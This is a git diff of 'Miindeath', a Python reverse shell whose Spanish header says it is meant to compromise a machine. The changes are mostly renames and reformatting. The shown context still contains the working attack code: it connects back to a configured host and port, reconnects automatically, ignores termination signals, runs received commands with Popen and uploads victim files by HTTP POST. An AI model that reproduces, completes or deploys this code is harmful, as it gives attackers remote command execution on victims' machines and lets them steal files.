@@ -2,9 +2,9 @@
 
 # Autor: DtxdF
 # Licencia: MIT License
-# Descripción: Miindeath (Siglas de MInImalist Death). Es una shell 
-#              inversa escrita en Python ( 3 ). que trata de ser lo 
-#              más simple posible para lograr comprometer una máquina.
+# Descripción: Miindeath (Siglas de MInImalist Death). Es una shell inversa escrita en
+#              Python ( 3 ). que trata de ser lo más simple posible para lograr compro
+#              meter una máquina.
 # Ejemplo de ejecución:
 #
 #  Victima:
@@ -29,7 +29,18 @@ from urllib import request, parse
 from time import sleep
 from urllib3 import disable_warnings
 from signal import signal, SIG_IGN
-from os import getcwd, chdir, access, X_OK, R_OK, kill, getpid, name as whoami
+from os import (
+                
+                getcwd,
+                chdir,
+                access,
+                X_OK,
+                R_OK,
+                kill,
+                getpid,
+                name as whoami
+                
+                )
 from os.path import isdir, isfile, basename
 from getpass import getuser
 from subprocess import Popen, STDOUT, PIPE
@@ -51,7 +62,7 @@ for _ in range(64):
             #print("Signal Error: {}".format(Except))
             pass
 
-class config(object):
+class Config(object):
 
     RHOST = 'localhost'
     RPORT = 4444
@@ -159,13 +170,13 @@ def check_file(filename, file=True):
 
 def main():
 
-    rhost = str(config.RHOST)
-    rport = int(config.RPORT)
-    limit = int(config.LIMIT)
+    rhost = str(Config.RHOST)
+    rport = int(Config.RPORT)
+    limit = int(Config.LIMIT)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    #sock.settimeout(config.timeout)
+    #sock.settimeout(Config.timeout)
 
     sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
     # Sí está en Windows...
@@ -173,8 +184,8 @@ def main():
         sock.setsockopt(socket.SOL_TCP, socket.TCP_QUICKACK, 1)
     except:
         pass
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, config.RECV)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, config.SEND)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, Config.RECV)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, Config.SEND)
 
     while(True):
 
@@ -186,9 +197,9 @@ def main():
 
             #print("Connection error: {}".format(Except))
 
-            if (config.RECONNECT):
+            if (Config.RECONNECT):
 
-                sleep(config.SLEEP)
+                sleep(Config.SLEEP)
 
             else:
 
@@ -203,7 +214,7 @@ def main():
     while(True):
 
         data = ''
-        cmd = sock.recv(config.RECV)
+        cmd = sock.recv(Config.RECV)
 
         if not (len(cmd) > 0):
 
@@ -211,7 +222,7 @@ def main():
 
         else:
 
-            cmds = cmd.decode().strip().split(config.UNIT_SEP)
+            cmds = cmd.decode().strip().split(Config.UNIT_SEP)
 
             for cmd in cmds:
 
@@ -302,8 +313,8 @@ def main():
 
                                             simple_requests(url[0], 'POST', { 
                                                 
-                                                                                config.FILENAME:basename(url[1]),
-                                                                                config.FILECONTENT:file_object.read()
+                                                                                Config.FILENAME:basename(url[1]),
+                                                                                Config.FILECONTENT:file_object.read()
                                                                                 
                                                                             }, False)
 
@@ -339,7 +350,14 @@ def main():
 
                             try:
 
-                                with Popen(shlex.split(shell_exec), shell=(whoami == 'nt'), stdout=PIPE, stderr=STDOUT, universal_newlines=True) as cmd_data:
+                                with Popen(
+                                            shlex.split(shell_exec),
+                                            shell=(whoami == 'nt'),
+                                            stdout=PIPE,
+                                            stderr=STDOUT,
+                                            universal_newlines=True
+                                            
+                                            ) as cmd_data:
 
                                     for _ in cmd_data.stdout.readlines():
 
@@ -397,6 +415,6 @@ if __name__ == '__main__':
 
         main()
 
-        if not (config.RECONNECT):
+        if not (Config.RECONNECT):
 
             break
